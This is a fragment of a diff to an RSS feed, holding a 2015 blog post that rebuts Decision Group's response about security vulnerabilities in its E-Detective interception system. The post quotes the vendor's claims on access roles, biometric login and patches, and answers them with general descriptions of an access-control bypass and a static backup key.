-&lt;p&gt;Furthermore, the actual function of E-Detective means that it can never be on a fully isolated network. There will always be an entry point. E-Detective intercepts communications by using a man-in-the-middle proxy. That proxy will need to be connected to the network that the customer wants to intercept communications from. Based on the case studies that they list on their website, that network will also probably be connected to the Internet.&lt;/p&gt;
-
-&lt;p&gt;Unless a human being is manually transferring data using external storage from the proxy to the E-Detective system, then the system will probably also be in some way connected to the proxy.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Since all users of E-Detective are of 4 types: operator, administrator, auditor and datamvr. Operator has the authorized right to input queries and view the scope of intercepted data by his/her own right. Administrator can have authorized right to conduct the operation of system backup, user management, and software system tuning…etc. Auditor has the only right to check and view all log files in the system. The last type of user is only for data transport between different systems, and it cannot be used for system access. None of these users has the superuser right of root. In most cases, root is basically set to hibernation status after system is activated by license under customer SLA request in order to terminate security backdoor.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;All of this is made useless by a vulnerability that was discovered after the publication of the original security advisory. It turns out that features that the root user has access to are hidden from the menu of other users, but other users can still access those features by manually navigating to each feature&amp;#39;s page.&lt;/p&gt;
-
-&lt;p&gt;Even if the root user is deactivated after installation in &amp;quot;most cases&amp;quot;, this still doesn&amp;#39;t address the fact that the system backup feature uses a static key, which can be exploited to perform remote code execution.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Besides, E-Detective can be integrated with OTP server for more secured access control, and all logon access record will be reviewed in OTP server for auditing. Biometric access mechanism module with fingerprint can be also available by customer request, but it depends on whether the fingerprint reader is supported on user workstation.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;The system is so dangerously insecure beyond easy repair at this point that we feel sorry for anyone that has to trust it with their biometric data.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;After all, E-Detective system is used by our customer for network forensic purpose, such as internal data leakage protection, cyber evidence collection and lawful interception. System security is always the top priority for our customer. All the vulnerabilities mentioned in the news by International Business Times have been fixed several months ago. “Customer IT security is always our top concern,” said Casper Kan Chang, CEO of Decision Group, “and we have already fixed all the vulnerabilities in this current version of E-Detective for more than 11 months.” For those existing customers with old version of system still has concern, Decision Group will update it for free without hesitation.&amp;quot;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;If IT security is &amp;quot;always&amp;quot; their top concern, why did it take them 3 years to (claim to) fix these vulnerabilities? Have they proactively contacted the customers that are running insecure versions of their software, or are they waiting for their customers to contact them?&lt;/p&gt;
-</description>
-        <pubDate>Thu, 25 Jun 2015 00:00:00 +0200</pubDate>
-        <link>/2015/06/25/e-detective-response.html</link>
-        <guid isPermaLink="true">/2015/06/25/e-detective-response.html</guid>
         
         
       </item>
